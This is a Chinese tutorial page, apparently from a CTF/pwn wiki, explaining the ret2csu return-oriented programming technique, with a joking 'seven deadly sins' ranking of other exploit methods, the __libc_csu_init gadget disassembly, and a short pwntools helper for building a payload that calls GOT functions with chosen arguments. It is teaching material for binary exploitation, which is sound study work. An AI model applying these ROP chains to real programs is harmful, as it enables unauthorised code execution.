# \[Ret2csu\]为什么是神？

---

最后更新于 2025-11-22 by XDLiu
??? note "在谈论这个问题之前，我想先说说其他pwn手法相较于它究竟差在了哪里。"

    首先是犯下**傲慢之罪的ret2text**。它总以为程序里自带一个完美的`get_shell`或`system("/bin/sh")`函数等着它去调用，轻蔑地忽视了那些需要自己动手构造调用链的凡人。当`ASLR`开启，或程序中没有后门，它的傲慢将化为泡影。

    接着是犯下**愤怒之罪的ret2t_shellcode**。它将自己的意志（`shellcode`）强行注入栈或堆中，妄图执行，却时常因没有执行权限的NX保护（天条）而被无情地拦下，最终只能在段错误（`SIGSEGV`）的怒火中崩溃。

    再然后是犯下**懒惰之罪的常规ROP**。它总是懒洋洋地期望着能找到现成的`pop rdi; ret`这类`gadget`，从不愿在没有直接可用工具时自己去想办法。一旦程序里缺少这种便利的零件，它便束手无策，只能瘫倒在地。

    犯下**嫉妒之罪的ret2syscall**。它嫉妒着内核享有的至高权力，处心积虑地寻找`syscall; ret`指令，妄图伪造调用号来染指那不属于它的力量。但寻找`syscall`的过程本身，就是它无法摆脱的枷锁。

    犯下**贪婪之罪的ret2libc**。它从不满足于程序本身有限的资源，贪婪地窥视着庞大而丰富的`libc`动态库。为了得到其中的`system`函数，它必须先泄露一个地址，再费尽心机计算整个库的基址，其贪欲昭然若揭。

    犯下**暴食之罪的SROP**。它更是欲壑难填，不满足于控制一两个寄存器。它试图通过一个`sigreturn`调用吞下整个寄存器上下文（`Sigcontext Frame`），一次性将`RDI, RSI, RDX, RAX`…乃至`RIP`全部据为己有，其暴食的姿态，令人咋舌。

    最后，是犯下**淫欲之罪的ret2dlresolve**。它觊觎着那些甚至没有被加载到GOT表中的“禁忌”函数，通过伪造数据结构、欺骗链接器（`_dl_runtime_resolve`）的感情，来达到它不可告人的邪恶目的，其手法之诡秘，用心之险恶，堪称ROP中的靡靡之音。

    **而Ret2csu，祂就是神。**

    当世界（指64位ELF程序）一片混沌，找不到任何可用的`gadget`时，祂出现了。祂不依赖现成的后门，也不惧怕NX的阻拦。祂不需泄露`libc`的地址，也不屑于`SROP`那般浮夸。祂，仅仅利用`__libc_csu_init`中那段普世长存的代码，便创造了秩序。祂以两次调用，优雅地掌控了`EDI, RSI, RDX`这函数调用的“三位一体”，为凡人铺设了通往任意函数调用的通天大道。

    在gadget的荒漠中，`Ret2csu`就是唯一的绿洲。

    所以，味大，无需多盐。

--------

### 来源

该手法涉及到一个函数`__libc_csu_init`在默认编译的情况下基本都会带有该函数，利用该函数的一部分代码可以做到没有pop系列的情况下，控制3个参数并调用任意代码。

```assembly
   0x4005d0 <__libc_csu_init+80>:       mov    rdx,r15
   0x4005d3 <__libc_csu_init+83>:       mov    rsi,r14
   0x4005d6 <__libc_csu_init+86>:       mov    edi,r13d
   0x4005d9 <__libc_csu_init+89>:       call   QWORD PTR [r12+rbx*8]
   0x4005dd <__libc_csu_init+93>:       add    rbx,0x1
   0x4005e1 <__libc_csu_init+97>:       cmp    rbx,rbp
   0x4005e4 <__libc_csu_init+100>:      jne    0x4005d0 <__libc_csu_init+80>
   0x4005e6 <__libc_csu_init+102>:      mov    rbx,QWORD PTR [rsp+0x8]
   0x4005eb <__libc_csu_init+107>:      mov    rbp,QWORD PTR [rsp+0x10]
   0x4005f0 <__libc_csu_init+112>:      mov    r12,QWORD PTR [rsp+0x18]
   0x4005f5 <__libc_csu_init+117>:      mov    r13,QWORD PTR [rsp+0x20]
   0x4005fa <__libc_csu_init+122>:      mov    r14,QWORD PTR [rsp+0x28]
   0x4005ff <__libc_csu_init+127>:      mov    r15,QWORD PTR [rsp+0x30]
   0x400604 <__libc_csu_init+132>:      add    rsp,0x38
   0x400608 <__libc_csu_init+136>:      ret
```

简单看过上面汇编，以上面为例一般选择先执行`0x4005e6`后再次执行`0x4005d0`即可控制参数了

### 使用

```python
# 假设 csu_pop_addr 和 csu_call_addr 已经定义
# 需要注意func是得指向代码段的指针的指针，比如想要执行read函数，func就得是got表地址，恰好got表储存的是read函数地址
ret2csu = lambda edi, rsi, rdx, func: \
    p64(0)*2 + p64(1) + p64(func) + p64(edi) + p64(rsi) + p64(rdx)

# ========== 使用示例 ==========
# payload = p64(csu_pop_addr) + ret2csu(0, data_addr, 5, read_got_addr) + p64(csu_call_addr) + ret2csu(1, data_addr, 5, write_got_addr)
# print(payload)
```

